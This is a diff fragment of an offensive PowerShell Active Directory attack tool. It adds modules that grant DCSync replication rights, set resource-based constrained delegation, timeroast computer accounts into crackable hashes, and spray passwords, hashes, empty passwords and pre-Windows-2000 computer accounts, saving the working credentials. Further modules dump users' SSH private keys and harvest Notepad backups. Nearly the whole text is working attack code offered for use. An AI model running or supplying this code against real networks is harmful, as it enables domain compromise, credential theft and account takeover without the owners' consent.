+                    catch { $Result += "[!] Error: retrieving domain security descriptor: $_`n" ; return $Result }
+        	
+                    # Define DCSync GUIDs
+                    $GetChangesGuid = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
+                    $GetChangesAllGuid = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
+        	
+                    # Create ACEs
+                    $Ace1 = New-Object System.Security.AccessControl.ObjectAce(
+                        [System.Security.AccessControl.AceFlags]::None,
+                        [System.Security.AccessControl.AceQualifier]::AccessAllowed,
+                        0x100,
+                        $UserSid,
+                        [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
+                        $GetChangesGuid,
+                        [Guid]::Empty,
+                        $false,
+                        $null
+                    )
+        	
+                    $Ace2 = New-Object System.Security.AccessControl.ObjectAce(
+                        [System.Security.AccessControl.AceFlags]::None,
+                        [System.Security.AccessControl.AceQualifier]::AccessAllowed,
+                        0x100,
+                        $UserSid,
+                        [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
+                        $GetChangesAllGuid,
+                        [Guid]::Empty,
+                        $false,
+                        $null
+                    )
+        	
+                    # Add ACEs to DACL
+                    $Sd.DiscretionaryAcl.InsertAce(0, $Ace1)
+                    $Sd.DiscretionaryAcl.InsertAce(0, $Ace2)
+            	
+                    $Result += "[*] Added DCSync ACEs to security descriptor`n"
+        	
+                    # Convert security descriptor to byte array
+                    $NewSd = New-Object byte[] $Sd.BinaryLength
+                    $Sd.GetBinaryForm($NewSd, 0)
+        	
+                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($DomainDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "nTSecurityDescriptor", $NewSd)
+        	
+                    #Write-Output "[*] Attempting to modify domain security descriptor"
+                    $ModifyResponse = $LdapConnection.SendRequest($ModifyRequest)
+                    
+                    if ($ModifyResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { return "[!] Failed to modify security descriptor: $($ModifyResponse.ResultCode)" }
+                    else { $Result += "[+] Successfully granted DCSync rights to $ObjectToElevate`n" ; return $Result }
+                
+                
+                }
+
+                elseif ($Module -eq "AddRBCD") {
+        
+        
+                    try {
+                
+                        $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($TargetDN, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "msDS-AllowedToActOnBehalfOfOtherIdentity")
+                        $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
+        
+                        if ($SearchResponse.Entries.Count -gt 0 -and $SearchResponse.Entries[0].Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"]) {
+                            return "Value msDS-AllowedToActOnBehalfOfOtherIdentity already exists. Use -Module RemoveRBCD to clear the value first"
+                        }
+                
+                        $Rsd = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)")
+                        $Rsdb = New-Object byte[] ($Rsd.BinaryLength)
+                        $Rsd.GetBinaryForm($Rsdb, 0)
+        
+                        $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
+                        $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
+                        $Modification.Add($Rsdb) > $null
+                        $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
+        	
+                        $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, $Modification)
+        
+                        try {
+                            $LdapConnection.SendRequest($ModifyRequest) > $null
+                            return "[+] msDS-AllowedToActOnBehalfOfOtherIdentity successfully added on ""$TargetDN"" for SID: $SID"
+                        }
+                
+                        catch { return "Error: $_" }
+                    }
+            
+                    catch { return "Error: $_" }
+                }
+
+                elseif ($Module -eq "RemoveRBCD") {
+
+                    $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
+                    $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
+                    $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
+                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, $Modification)
+            	
+                    $LdapConnection.SendRequest($ModifyRequest) > $null
+                    return "[+] msDS-AllowedToActOnBehalfOfOtherIdentity Removed from $TargetDN"
+                }
+
+                elseif ($Module -eq "timeroast") {
+
+                    Function Invoke-AuthenticatedTimeRoast {
+
+                        param(
+                            [Parameter(Mandatory = $true)]
+                            [string]$DomainController,
+                            [int]$Rate = 180,
+                            [int]$Timeout = 24
+                        )
+
+                        $ErrorActionPreference = "Stop"
+                        $NtpPrefix = [byte[]]@(0xdb, 0x00, 0x11, 0xe9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x40, 0x7d, 0xeb, 0xc7, 0xe5, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a)
+
+                        $Client = New-Object System.Net.Sockets.UdpClient
+                        $Client.Client.ReceiveTimeout = [Math]::Floor(1000 / $Rate)
+                        $Client.Connect($DomainController, 123)
+
+                        function Get-ComputerRids {
+                            param([string]$DomainController)
+
+                            $Searcher = New-Object System.DirectoryServices.DirectorySearcher
+                            $Searcher.SearchRoot = "LDAP://$DomainController"
+                            $Searcher.Filter = "(&(objectCategory=computer))"
+                            $Searcher.PageSize = 1000
+                            $Searcher.PropertiesToLoad.AddRange(@("sAMAccountName", "objectSID"))
+
+                            $Computers = @()
+                            
+                            foreach ($Result in $Searcher.FindAll()) {
+            
+                                try {
+                
+                                    $SamAccountName = $Result.Properties["sAMAccountName"][0]
+                                    $Sid = New-Object System.Security.Principal.SecurityIdentifier($Result.Properties["objectsid"][0], 0)
+                                    $Rid = [int]$Sid.Value.Split("-")[-1]
+
+                                    $Computers += [PSCustomObject]@{
+                                        Name = $SamAccountName
+                                        RID  = $Rid
+                                    }
+                                }
+            
+                                catch { continue }
+                            }
+
+                            return $Computers
+                        }
+
+                        $Computers = Get-ComputerRids -DomainController $DomainController
+                        $TimeoutTime = (Get-Date).AddSeconds($Timeout)
+
+                        $WordlistPath = "$Timeroast\.Wordlist.txt"
+                        Remove-item $WordlistPath -force -ErrorAction "SilentlyContinue"
+
+                        foreach ($Computer in $Computers) {
+            
+                            $Name = $Computer.Name.TrimEnd('$').ToLower()
+                            $Name | Out-File -Append -FilePath $WordlistPath -Encoding "ascii"
+        
+                        }
+
+                        foreach ($Computer in $Computers) {
+                            
+                            $Rid = $Computer.RID
+                            $Query = $NtpPrefix + [BitConverter]::GetBytes($Rid) + [byte[]]::new(16)
+
+                            [void] $Client.Send($Query, $Query.Length)
+
+                            try {
+                                
+                                $Reply = $Client.Receive([ref]$null)
+
+                                if ($Reply.Length -eq 68) {
+                
+                                    $Salt = [byte[]]$Reply[0..47]
+                                    $Md5Hash = [byte[]]$Reply[-16..-1]
+                                    $AnswerRid = [BitConverter]::ToUInt32($Reply[-20..-16], 0)
+
+                                    $HexSalt = [BitConverter]::ToString($Salt).Replace("-", "").ToLower()
+                                    $HexHash = [BitConverter]::ToString($Md5Hash).Replace("-", "").ToLower()
+                
+                                    $ComputerHostname = $Computer.Name.TrimEnd('$')
+                                    $HashcatHash = "$ComputerHostname`:`$sntp-ms`${0}`${1}" -f $HexHash, $HexSalt
+
+                                    Write-Output $HashcatHash
+                                    $TimeoutTime = (Get-Date).AddSeconds($Timeout)
+                                
+                                }
+                            }
+        
+                            catch { continue }
+                        }
+
+                        return $Result
+                        $Client.Close()
+                    }
+
+                    $Timestamp = Get-Date -Format o | ForEach-Object { $_ -replace ":", "." }
+
+                    if ($ShowOutput) {
+                    
+                        return Invoke-AuthenticatedTimeRoast -DomainController $ComputerName  | Out-string | Sort-Object | Tee-Object "$Timeroast\$Timestamp.txt"
+
+                    }
+
+                    else {
+                     
+                        return Invoke-AuthenticatedTimeRoast -DomainController $ComputerName  | Out-string | Sort-Object | Out-File "$Timeroast\$Timestamp.txt"
+
+                    }
+
+                } 
+            }
+            
+            catch { return "Error: $_" }
+            finally { if ($LdapConnection) { $LdapConnection.Dispose() } }
+        }
+
+
+        foreach ($computer in [array]$Computers) {
+
+            if (!$IPAddress) {
+                $ComputerName = $computer.Properties["dnshostname"][0]
+                $OS = $computer.Properties["operatingSystem"][0]
+            }
+
+            elseif ($IPAddress) {
+                $ComputerName = "$Computer"
+                $OS = "OS:PLACEHOLDER"
+            }
+
+            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Timeout).AddArgument($Module).AddArgument($TargetDN).AddArgument($GroupDN).AddArgument($SID).AddArgument($LDAPS).AddArgument($Timeroast).AddArgument($ShowOutput)
+            $runspace.RunspacePool = $runspacePool
+
+            [void]$runspaces.Add([PSCustomObject]@{
+                    Runspace     = $runspace
+                    Handle       = $runspace.BeginInvoke()
+                    ComputerName = $ComputerName
+                    OS           = $OS
+                    Completed    = $false
+                })
+        }
+
+
+        do {
+            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+
+                if ($runspace.Handle.IsCompleted) {
+                    
+                    $runspace.Completed = $true
+                    $result = $null
+                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)[0]
+                    $Cleanup = $runspace.Runspace.EndInvoke($runspace.Handle)[1]
+                    $Class = $runspace.Runspace.EndInvoke($runspace.Handle)[2]
+                    $hasDisplayedResult = $false
+                    
+                    try {
+                        # remove later?
+                        #$result = $result.Trim()
+                    }
+                    
+                    catch {}
+
+                    if ($result -eq "Unable to connect") { continue }
+
+                    if ($result -like "Error:*") {
+
+                        $Global:SuccessCount++
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText $result -NameLength $NameLength -OSLength $OSLength
+                        continue
+
+                    }
+
+                    else {
+                    
+                        $Global:SuccessCount++
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+
+                        ""
+                        $result | Write-Output
+
+                    }
+
+
+                    # Dispose of runspace and close handle
+                    $runspace.Runspace.Dispose()
+                    $runspace.Handle.AsyncWaitHandle.Close()
+                }
+            }
+
+            Start-Sleep -Milliseconds 100
+        } while ($runspaces | Where-Object { -not $_.Completed })
+
+
+        $runspacePool.Close()
+        $runspacePool.Dispose()
+    }
+
 
     ################################################################################################################
     ################################################## Function: Spray #############################################
@@ -5960,6 +6654,18 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
 
         }
 
+        if ($Pre2k) {          
+            $SprayHash = ""
+            $SprayPassword = ""
+            $AccountAsPassword = $False
+
+            Write-Host
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "Spraying for Pre2k accounts."
+            Write-Host
+
+        }
+
         if ($SprayPassword -ne "") {
             $SprayHash = ""
             $AccountAsPassword = $False
@@ -5994,154 +6700,194 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
 
         
         $SuccessUsers = @()
-        foreach ($UserToSpray in $EnabledDomainUsers) {
-            $Delay = Get-Random -Minimum 5 -Maximum 20
-            Start-Sleep -Milliseconds $Delay
+        
+        # Add Bloodhound queries to this at a later date
+        if ($Pre2k) {
+        Write-Host
 
-            Write-Log -Message  "Querying user $UserToSpray from LDAP"
+            foreach ($Computer in $ComputerSamAccounts) {
 
-            try {
-                $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
-                $searchResult = $searcher.FindOne()
-                $badPwdCount = $searchResult.Properties["badPwdCount"][0]  
-
-                if ($badPwdCount -ge $SafeLimit) {
-                    if (!$SuccessOnly) {
-                        Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
-                        Write-Host "$Domain\$UserToSpray - Safe threshold met"
-                        continue
-                    }
+                $Pre2kName = $Computer.ToString()
+                $Pre2kName = $Pre2kName.Trim('$').ToLower()
+                $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$Pre2kName", "$Pre2kName")
+        
+                if ($Attempt.name -ne $null) {
+                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                    Write-Host "$Domain\$Pre2kName"
+                        
+                    $SuccessfulUser = "$Domain\$Pre2kName"
+                    $SuccessUsers += $SuccessfulUser
+                        
+                    "$Domain\${Pre2kName}:$Pre2kName" | Out-file -FilePath "$Spraying\$Domain-Pre2k.txt" -Encoding "Unicode" -Append
                 }
-                # Hash Spraying
-                if ($SprayHash -ne "") {
-                    if ($SprayHash.Length -eq 32) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain /force /opsec | Out-String }
-                    elseif ($SprayHash.Length -eq 64) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /aes256:$SprayHash /domain:$domain /enctype:aes256 | Out-String }
-                    elseif ($SprayHash.Length -eq 65) {
-                        $colonCount = ($SprayHash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
-                        if ($colonCount -ne 1) {
-                            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-                            Write-Host "Ensure the provided value for the NTLM hash is formed as LM:NT"
-                            Write-Host "Example: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe"
-                            break
+
+                elseif (!$SuccessOnly) {
+                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                    Write-Host "$Domain\$Pre2kName"
+                }
+
+            }
+
+            if ("$Spraying\$Domain-Pre2k.txt"){
+
+                (Get-Content "$Spraying\$Domain-Pre2k.txt" -ErrorAction "SilentlyContinue" | Where-Object { $_.Trim() -ne "" } | Sort-Object -Unique) | Set-Content "$Spraying\$Domain-Pre2k.txt" -Force
+
+            } 
+
+        }
+
+        else {
+        
+            foreach ($UserToSpray in $EnabledDomainUsers) {
+                $Delay = Get-Random -Minimum 5 -Maximum 20
+                Start-Sleep -Milliseconds $Delay
+
+                Write-Log -Message  "Querying user $UserToSpray from LDAP"
+
+                try {
+                    $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
+                    $searchResult = $searcher.FindOne()
+                    $badPwdCount = $searchResult.Properties["badPwdCount"][0]  
+
+                    if ($badPwdCount -ge $SafeLimit) {
+                        if (!$SuccessOnly) {
+                            Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
+                            Write-Host "$Domain\$UserToSpray - Safe threshold met"
+                            continue
                         }
+                    }
+                    # Hash Spraying
+                    if ($SprayHash -ne "") {
+                        if ($SprayHash.Length -eq 32) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain /force /opsec | Out-String }
+                        elseif ($SprayHash.Length -eq 64) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /aes256:$SprayHash /domain:$domain /enctype:aes256 | Out-String }
+                        elseif ($SprayHash.Length -eq 65) {
+                            $colonCount = ($SprayHash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
+                            if ($colonCount -ne 1) {
+                                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                                Write-Host "Ensure the provided value for the NTLM hash is formed as LM:NT"
+                                Write-Host "Example: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe"
+                                break
+                            }
                     
-                        $SprayHash = $SprayHash.Split(':')[1]
-                        $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain /force /opsec | Out-String
+                            $SprayHash = $SprayHash.Split(':')[1]
+                            $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain /force /opsec | Out-String
+                        }
+
+                        # Check for Unhandled exception
+                        if ($Attempt.IndexOf("Unhandled rTickets exception:") -ne -1) {
+                            if (!$SuccessOnly) {
+                                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                                Write-Host "$Domain\$UserToSpray"
+                            }    
+                        } 
+                        # Check for KDC_ERR_PREAUTH_FAILED
+                        elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED") -ne -1) {
+                            if (!$SuccessOnly) {
+                                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                                Write-Host "$Domain\$UserToSpray"
+                            }   
+                        }
+					
+                        # Check for RC4 Errors
+                        elseif ($Attempt.IndexOf("NOTSUPP") -ne -1) {
+                            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                            Write-Host "$Domain\$UserToSpray - RC4 type not supported"
+                        }
+					
+                        # Check for a value that only appears in a success status
+                        elseif ($Attempt.IndexOf("NameService              :") -ne -1) {
+                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                            Write-Host "$Domain\$UserToSpray"
+
+                            $SuccessfulUser = "$Domain\$UserToSpray"
+                            $SuccessUsers += $SuccessfulUser
+                        
+                            "$Domain\${UserToSpray}:$SprayHash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
+                            Append-BHQuery -Username $UserToSpray -Domain $Domain -UserOwned
+                            if ($SprayHash.Length -eq 64) { Append-BHQuery -Username $UserToSpray -Domain $Domain -AES256 $SprayHash -AESProperty }
+                            elseif ($SprayHash.Length -eq 32) { Append-BHQuery -Username $UserToSpray -Domain $Domain -RC4 $SprayHash -RC4Property }
+                        
+                        }
                     }
 
-                    # Check for Unhandled exception
-                    if ($Attempt.IndexOf("Unhandled rTickets exception:") -ne -1) {
-                        if (!$SuccessOnly) {
+                    # Password Spraying
+                    if ($SprayPassword -ne "") {
+                    
+                    
+                        $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$SprayPassword")
+        
+                        if ($Attempt.name -ne $null) {
+                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                            Write-Host "$Domain\$UserToSpray"
+                        
+                            $SuccessfulUser = "$Domain\$UserToSpray"
+                            $SuccessUsers += $SuccessfulUser
+                        
+                            "$Domain\${UserToSpray}:$SprayPassword" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
+                            Append-BHQuery -Username $UserToSpray -Domain $Domain
+                            Append-BHQuery -Username $UserToSpray -Domain $Domain -Password $SprayPassword -PasswordProperty
+                        }
+
+                        elseif (!$SuccessOnly) {
                             Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                             Write-Host "$Domain\$UserToSpray"
-                        }    
-                    } 
-                    # Check for KDC_ERR_PREAUTH_FAILED
-                    elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED") -ne -1) {
-                        if (!$SuccessOnly) {
+                        }
+                    }
+                    # Account as password
+                    if ($AccountAsPassword) {
+
+                        $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$UserToSpray")
+        
+                        if ($Attempt.name -ne $null) {
+                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                            Write-Host "$Domain\$UserToSpray"
+                        
+                            $SuccessfulUser = "$Domain\$UserToSpray"
+                            $SuccessUsers += $SuccessfulUser
+                        
+                            "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
+                            Append-BHQuery -Username $UserToSpray -Domain $Domain -UserOwned
+                            Append-BHQuery -Username $UserToSpray -Domain $Domain -Password $UserToSpray -PasswordProperty
+                        }
+
+                        elseif (!$SuccessOnly) {
                             Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                             Write-Host "$Domain\$UserToSpray"
-                        }   
-                    }
-					
-                    # Check for RC4 Errors
-                    elseif ($Attempt.IndexOf("NOTSUPP") -ne -1) {
-                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-                        Write-Host "$Domain\$UserToSpray - RC4 type not supported"
-                    }
-					
-                    # Check for a value that only appears in a success status
-                    elseif ($Attempt.IndexOf("NameService              :") -ne -1) {
-                        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-                        Write-Host "$Domain\$UserToSpray"
-
-                        $SuccessfulUser = "$Domain\$UserToSpray"
-                        $SuccessUsers += $SuccessfulUser
-                        
-                        "$Domain\${UserToSpray}:$SprayHash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
-                        Append-BHQuery -Username $UserToSpray -Domain $Domain -UserOwned
-                        if ($SprayHash.Length -eq 64) { Append-BHQuery -Username $UserToSpray -Domain $Domain -AES256 $SprayHash -AESProperty }
-                        elseif ($SprayHash.Length -eq 32) { Append-BHQuery -Username $UserToSpray -Domain $Domain -RC4 $SprayHash -RC4Property }
-                        
-                    }
-                }
-
-                # Password Spraying
-                if ($SprayPassword -ne "") {
-                    
-                    
-                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$SprayPassword")
-        
-                    if ($Attempt.name -ne $null) {
-                        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-                        Write-Host "$Domain\$UserToSpray"
-                        
-                        $SuccessfulUser = "$Domain\$UserToSpray"
-                        $SuccessUsers += $SuccessfulUser
-                        
-                        "$Domain\${UserToSpray}:$SprayPassword" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
-                        Append-BHQuery -Username $UserToSpray -Domain $Domain
-                        Append-BHQuery -Username $UserToSpray -Domain $Domain -Password $SprayPassword -PasswordProperty
-                    }
-
-                    elseif (!$SuccessOnly) {
-                        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                        Write-Host "$Domain\$UserToSpray"
-                    }
-                }
-                # Account as password
-                if ($AccountAsPassword) {
-
-                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$UserToSpray")
-        
-                    if ($Attempt.name -ne $null) {
-                        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-                        Write-Host "$Domain\$UserToSpray"
-                        
-                        $SuccessfulUser = "$Domain\$UserToSpray"
-                        $SuccessUsers += $SuccessfulUser
-                        
-                        "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
-                        Append-BHQuery -Username $UserToSpray -Domain $Domain -UserOwned
-                        Append-BHQuery -Username $UserToSpray -Domain $Domain -Password $UserToSpray -PasswordProperty
-                    }
-
-                    elseif (!$SuccessOnly) {
-                        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                        Write-Host "$Domain\$UserToSpray"
-                    }
+                        }
     
-                }
+                    }
 
-                # EmptyPasswords
-                if ($EmptyPassword) {
-                    $SprayPassword = ""
+                    # EmptyPasswords
+                    if ($EmptyPassword) {
+                        $SprayPassword = ""
        
-                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$SprayPassword")
+                        $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$SprayPassword")
         
-                    if ($Attempt.name -ne $null) {
-                        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-                        Write-Host "$Domain\$UserToSpray"
+                        if ($Attempt.name -ne $null) {
+                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                            Write-Host "$Domain\$UserToSpray"
                         
-                        $SuccessfulUser = "$Domain\$UserToSpray"
-                        $SuccessUsers += $SuccessfulUser
+                            $SuccessfulUser = "$Domain\$UserToSpray"
+                            $SuccessUsers += $SuccessfulUser
                         
-                        "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
-                        Append-BHQuery -Username $UserToSpray -Domain $Domain -Password "Empty Password" -PasswordProperty
-                    }
+                            "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
+                            Append-BHQuery -Username $UserToSpray -Domain $Domain -Password "Empty Password" -PasswordProperty
+                        }
 
-                    elseif (!$SuccessOnly) {
-                        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                        Write-Host "$Domain\$UserToSpray"
+                        elseif (!$SuccessOnly) {
+                            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                            Write-Host "$Domain\$UserToSpray"
+                        }
                     }
                 }
-            }
-            catch {
+                catch {
         
-                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                Write-Host "$Domain\$UserToSpray - Exception occurred: $($_.Exception.Message)"
+                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                    Write-Host "$Domain\$UserToSpray - Exception occurred: $($_.Exception.Message)"
         
+                }
             }
+
         }
 
         
@@ -9173,15 +9919,9 @@ public class Advapi32 {
         "Inject" {}
         "IPMI" { Method-IPMI }
         "DCSync" { Method-DCSync }
+        "LDAP" { Method-LDAP }
+        "LDAPS" { Method-LDAP }
         
-        default {
-            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-            Write-Host "Invalid Method specified"
-            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter, Kerberoast, Inject, IPMI or DCSync"
-            return
-      
-        }
     }
 
     if (!$NoParse) { if ($Module -eq "SAM") { Parse-SAM } }
@@ -9917,6 +10657,64 @@ function Get-FileZillaCredentials {
 '@
 
 ################################################################################################################
+############################################# Module: SSH ######################################################
+################################################################################################################
+
+$Global:LocalSSH = @'
+function Invoke-SSHDump {
+    $Directory_Child_Items = @()
+    $foundResults = $false
+
+    function Get-UserDirectories {
+        Get-ChildItem -Path "C:\Users" -Directory | Where-Object {
+            Test-Path "$($_.FullName)\.ssh"
+        }
+    }
+
+    $SSH_Files = Get-UserDirectories
+
+    foreach ($UserDir in $SSH_Files) {
+        $Files = Get-ChildItem -Path "$($UserDir.FullName)\.ssh" | Select-Object -ExpandProperty FullName
+        
+        foreach ($File in $Files) {
+            $Content = Get-Content $File -First 1
+
+            if ($Content -like "----*") {
+                $foundResults = $true
+                Write-Output "[Key: $($File)]"
+                Write-Output ""
+                Get-Content -Path $File -Raw
+                continue
+            }
+
+            if ($Content -like "ssh-*") {
+                $foundResults = $true
+                Write-Output "[Public Key: $($File)]"
+                Write-Output ""
+                Get-Content -Path $File -Raw
+                continue
+            }
+
+            if ($File -like "*known_hosts*") {
+                $foundResults = $true
+                Write-Output "[Known Hosts: $($File)]"
+                Write-Output ""
+                Get-Content -Path $File -ErrorAction "SilentlyContinue" | ForEach-Object { ($_ -split '\s+')[0] }
+                Write-Output ""
+                continue
+            }
+        }
+    }
+
+    if (-not $foundResults) {
+        Write-Output "No Results"
+    }
+}
+
+Invoke-SSHDump
+'@
+
+################################################################################################################
 ############################################ Module: Wifi ######################################################
 ################################################################################################################
 
@@ -9984,75 +10782,127 @@ function DumpNotepad {
 
         $Results
     }
+    
+    
+function Get-UserProfilePaths { (Get-ChildItem -Path "$env:SystemDrive\Users" | Where-Object { $_.BaseName -ne "Public" -and $_.BaseName -notlike "*defaultuser*" }).BaseName }
+    
+function Get-NotePadPlusPlus {
+    param ([string]$UserProfile)
 
-    function Get-UserProfilePaths {
-        (Get-ChildItem -Path "$env:SystemDrive\Users" | 
-            Where-Object { $_.BaseName -ne "Public" -and $_.BaseName -notlike "*defaultuser*" }
-        ).BaseName
-    }
+    $RootPath = "C:\Users\$UserProfile\AppData\Roaming\Notepad++\backup"
+    $BackupFiles = Get-ChildItem -Path $RootPath -ErrorAction "SilentlyContinue"
 
-    function Get-NotePadPlusPlus {
-        param (
-            [string]$UserProfile
-        )
+    foreach ($BackupFile in $BackupFiles) {
+        
+        try {
+            
+            $Content = Get-Content -Path $BackupFile.FullName -Raw -ErrorAction "Stop"
 
-        $RootPath = "$env:SystemDrive\Users\$UserProfile\APPDATA\Roaming\NotePad++\backup\"
-        $BackupFiles = Get-ChildItem -Path $RootPath -ErrorAction "SilentlyContinue"
-
-        foreach ($BackupFile in $BackupFiles) {
-            $FullPath = $BackupFile.FullName
-            $Content = Get-Content -Raw -Path $FullPath
-            #Write-Output "========================================================================================="
-            Write-Output "File Name: $($BackupFile.Name)"
+            Write-Output "File Path: $($BackupFile.FullName)"
             Write-Output ""
             Write-Output $Content
             Write-Output "========================================================================================="
-        }
+        
+        } catch {}
     }
+}
 
-    function Get-Notepad {
-        param (
-            [string]$UserProfile
-        )
+function Get-Notepad {
+    param ([string]$UserProfile)
 
-        $PackagesPath = "$env:SystemDrive\Users\$UserProfile\AppData\Local\Packages"
-        $NotepadPath = Get-ChildItem -Path $PackagesPath -Filter "Microsoft.WindowsNotepad_*" -Directory -ErrorAction "SilentlyContinue" | Select-Object -First 1
+    $PackagesPath = "C:\Users\$UserProfile\AppData\Local\Packages"
+    $NotepadPath = Get-ChildItem -Path $PackagesPath -Filter "Microsoft.WindowsNotepad_*" -Directory -ErrorAction SilentlyContinue | Select-Object -First 1
 
-        if ($NotepadPath) {
-            $RootPath = "$($NotepadPath.FullName)\LocalState\TabState\"
-            $BackupFiles = Get-ChildItem -Path $RootPath -ErrorAction "SilentlyContinue"
+    if ($NotepadPath) {
